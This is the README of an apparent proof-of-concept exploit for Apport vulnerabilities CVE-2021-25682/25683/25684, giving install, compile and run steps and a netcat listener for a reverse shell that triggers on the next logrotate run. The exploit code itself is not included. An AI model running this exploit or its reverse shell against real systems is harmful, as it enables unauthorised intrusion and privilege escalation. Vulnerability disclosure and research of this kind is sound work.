# POC for Apport exploit (CVE-2021-25682 / CVE-2021-25683 / CVE-2021-25684)
This is a POC for Apport exploit, we exploited these bugs by launching a reverse shell to 127.0.0.1:1234.

## Setup

To compile the exploit code several packages are needed:

```bash
sudo apt-get install build-essential nasm gcc
```

## Compilation
```bash
make
```

## Run

```bash
./exploit.sh
```

The reverse shell will connect on the next execution of logrotate

```bash
nc -l -p 1234
```
